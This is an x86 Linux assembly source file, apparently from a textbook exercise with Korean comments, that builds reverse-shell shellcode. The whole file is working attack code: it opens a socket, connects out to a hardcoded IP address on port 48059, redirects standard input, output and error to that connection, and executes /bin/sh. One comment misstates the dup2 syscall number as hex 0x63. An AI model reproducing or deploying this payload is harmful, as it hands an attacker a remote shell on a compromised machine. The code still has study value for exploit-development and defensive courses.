BITS 32
section .text
global _start
_start:
xor eax,eax	; eax 클리어
xor ebx,ebx	; ebx 클리어
xor edx,edx	; edx 클리어

;socket(2,1,0)
push	eax	; socket에 대한 세 번째 인수: 0
push	byte 0x1; socket에 대한 두 번째 인수: 1
push	byte 0x2; socket에 대한 첫 번째 인수: 2
mov	ecx,esp	; 인수에 대한 포인터를 ecx로 이동(socketcall에 대한 두 번째 인수)
inc	bl	; socketcall의 첫 번째 인수를 # 1로 지정
mov	al,102	; socketcall # 1 호출: SYS_SOCKET
int	0x80	; 커널 모드로 점프, syscall 호출
mov	esi,eax	; 반환값(eax)을 esi에 저장

; 다음 블록은 bind, listen, accept 호출을 connect로 대체함
;client=connect(server,(struct sockaddr *)&serv_addr,0x10)
push	edx		; 아직 0임, 푸시된 다음 값 초기화하는 데 사용
push	long 0x650A0A0A	; 추가된 내용, 거꾸로 된 16진수로 주소를 푸시
push	word 0xBBBB	; 스택에 포트 푸시, 십진수로는 48059
xor	ecx, ecx	; sa_family 필드를 저장할 ecx 초기화
mov	cl,2		; 하나의 바이트:2를 ecx의 낮은 순서 바이트로 이동
push	word cx ;	; 구조체 생성, 포트 사용, sin.family:0002 4 bytes
mov	ecx,esp		; 스택에 있는 addr 구조체를 ecx로 이동
push	byte  0x10	; connect 인수 시작, 16 스택 푸시
push	ecx		; 스택의 구조체 주소를 저장
push	esi		; 서버 파일 기술자(esi)를 스택에 저장
mov	ecx,esp		; 인수의 포인터를 ecx에 저장(socketcall의 두 번째 인수)
mov	bl,3		; bl을 # 3으로 설정, socketcall의 첫 번째 인수
mov	al,102		; socketcall # 3 호출: SYS_CONNECT
int	0x80		; 커널 모드로 점프, syscall 호출

; dup2 명령 준비, ebx에 저장된 클라이언트 파일 핸들이 필요함
mov	ebx,esi	; 반환된 클라이언트의 soc 파일 기술자를 ebx로 복사

;dup2(soc, 0)
xor	ecx,ecx	; ecx 초기화
mov	al,63	; syscall의 첫 번째 인수를 0x63로 설정: dup2
int	0x80	; 점프

;dup2(soc, 1)
inc	ecx	; ecx를 1로 증가
mov	al,63	; dup2:63에 대한 syscall 준비
int	0x80	; 점프

;dup2(soc, 2)
inc	ecx	; ecx를 2로 증가
mov	al,63	; dup2:63에 대한 syscall 준비
int	0x80	; 점프

;standard execve("/bin/sh"...
push edx
push long 0x68732f2f
push long 0x6e69622f
mov  ebx,esp
push edx
push ebx
mov  ecx,esp
mov  al, 0x0b
int 0x80
